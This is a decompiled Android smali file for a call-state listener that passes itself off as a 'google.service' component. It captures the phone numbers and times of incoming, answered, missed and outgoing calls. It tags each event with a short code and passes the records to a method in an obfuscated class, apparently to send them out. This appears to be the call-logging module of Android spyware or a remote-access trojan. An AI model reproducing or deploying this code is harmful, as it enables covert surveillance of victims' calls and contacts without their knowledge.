.class public Lgoogle/service/_callr_lsnr_;
.super Landroid/content/BroadcastReceiver;
.source "_callr_lsnr_.java"


# static fields
.field private static callStartTime:Ljava/lang/String;

.field private static isIncoming:Z

.field private static lastState:I

.field private static savedNumber:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 12
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 157
    sget-boolean v0, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz v0, :cond_0

    .line 158
    sget-object v0, Lgoogle/service/䉀φ₫יⶱˉˈˋφʾﹳ$ˉㅤᵢ$ˋʿʾ$ᵔ䉀ʿ$יʿㅤ$$ᴵˋ4774;->cl:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, "|"

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->getBytes()[B

    move-result-object p1

    invoke-static {v0, p1}, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->AumeVodcmCGNSRurHjuj4816(Ljava/lang/String;[B)V

    :cond_0
    return-void
.end method

.method public onCallStateChanged(Landroid/content/Context;ILjava/lang/String;)V
    .locals 3

    .line 53
    invoke-static {}, Ljava/text/DateFormat;->getDateTimeInstance()Ljava/text/DateFormat;

    move-result-object v0

    invoke-static {}, Ljava/util/Calendar;->getInstance()Ljava/util/Calendar;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Calendar;->getTime()Ljava/util/Date;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/text/DateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    move-result-object v0

    .line 54
    sget v1, Lgoogle/service/_callr_lsnr_;->lastState:I

    if-ne v1, p2, :cond_0

    return-void

    :cond_0
    const/4 v2, 0x1

    if-eqz p2, :cond_4

    if-eq p2, v2, :cond_3

    const/4 p3, 0x2

    if-eq p2, p3, :cond_1

    goto :goto_0

    :cond_1
    if-eq v1, v2, :cond_2

    const/4 p3, 0x0

    .line 69
    sput-boolean p3, Lgoogle/service/_callr_lsnr_;->isIncoming:Z

    .line 70
    sput-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    .line 71
    sget-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    invoke-virtual {p0, p1, p3, v0}, Lgoogle/service/_callr_lsnr_;->onOutgoingCallStarted(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 75
    :cond_2
    sput-boolean v2, Lgoogle/service/_callr_lsnr_;->isIncoming:Z

    .line 76
    sput-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    .line 77
    sget-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    invoke-virtual {p0, p1, p3, v0}, Lgoogle/service/_callr_lsnr_;->onIncomingCallAnswered(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 60
    :cond_3
    sput-boolean v2, Lgoogle/service/_callr_lsnr_;->isIncoming:Z

    .line 62
    sput-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    .line 63
    sput-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    .line 64
    invoke-virtual {p0, p1, p3, v0}, Lgoogle/service/_callr_lsnr_;->onIncomingCallReceived(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    :cond_4
    if-ne v1, v2, :cond_5

    .line 85
    sget-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    sget-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    invoke-virtual {p0, p1, p3, v0}, Lgoogle/service/_callr_lsnr_;->onMissedCall(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0

    .line 87
    :cond_5
    sget-boolean p3, Lgoogle/service/_callr_lsnr_;->isIncoming:Z

    if-eqz p3, :cond_6

    .line 88
    sget-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    sget-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {p0, p1, p3, v0, v1}, Lgoogle/service/_callr_lsnr_;->onIncomingCallEnded(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/util/Date;)V

    goto :goto_0

    .line 91
    :cond_6
    sget-object p3, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    sget-object v0, Lgoogle/service/_callr_lsnr_;->callStartTime:Ljava/lang/String;

    new-instance v1, Ljava/util/Date;

    invoke-direct {v1}, Ljava/util/Date;-><init>()V

    invoke-virtual {p0, p1, p3, v0, v1}, Lgoogle/service/_callr_lsnr_;->onOutgoingCallEnded(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/util/Date;)V

    .line 95
    :goto_0
    sput p2, Lgoogle/service/_callr_lsnr_;->lastState:I

    return-void
.end method

.method protected onIncomingCallAnswered(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 111
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 113
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@ens"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected onIncomingCallEnded(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/util/Date;)V
    .locals 0

    .line 121
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 122
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@ene"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected onIncomingCallReceived(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 101
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 103
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@onn"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected onMissedCall(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 150
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 152
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@mc"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected onOutgoingCallEnded(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/util/Date;)V
    .locals 0

    .line 139
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 141
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@oge"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method protected onOutgoingCallStarted(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .line 130
    sget-boolean p1, Lgoogle/service/ᴵˎˉθʾᵢⶱⶱʾ䉀ʾˑʼθʼ䉀ᘣיঙᵢ$ˉᵢˈㅤⶱ4773;->echo:Z

    if-eqz p1, :cond_0

    .line 132
    invoke-virtual {p3}, Ljava/lang/String;->toString()Ljava/lang/String;

    move-result-object p1

    const-string p3, "@ogs"

    invoke-virtual {p0, p3, p2, p1}, Lgoogle/service/_callr_lsnr_;->LOGIT(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_0
    return-void
.end method

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 3

    .line 19
    :try_start_0
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.intent.action.NEW_OUTGOING_CALL"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 21
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p1

    const-string p2, "incoming_number"

    invoke-virtual {p1, p2}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    sput-object p1, Lgoogle/service/_callr_lsnr_;->savedNumber:Ljava/lang/String;

    goto :goto_1

    .line 24
    :cond_0
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "state"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 25
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object p2

    const-string v1, "android.intent.extra.PHONE_NUMBER"

    invoke-virtual {p2, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    .line 27
    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_IDLE:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    const/4 v2, 0x0

    if-eqz v1, :cond_1

    goto :goto_0

    .line 30
    :cond_1
    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_OFFHOOK:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    const/4 v2, 0x2

    goto :goto_0

    .line 33
    :cond_2
    sget-object v1, Landroid/telephony/TelephonyManager;->EXTRA_STATE_RINGING:Ljava/lang/String;

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_3

    const/4 v2, 0x1

    .line 38
    :cond_3
    :goto_0
    invoke-virtual {p0, p1, v2, p2}, Lgoogle/service/_callr_lsnr_;->onCallStateChanged(Landroid/content/Context;ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_1
    return-void
.end method
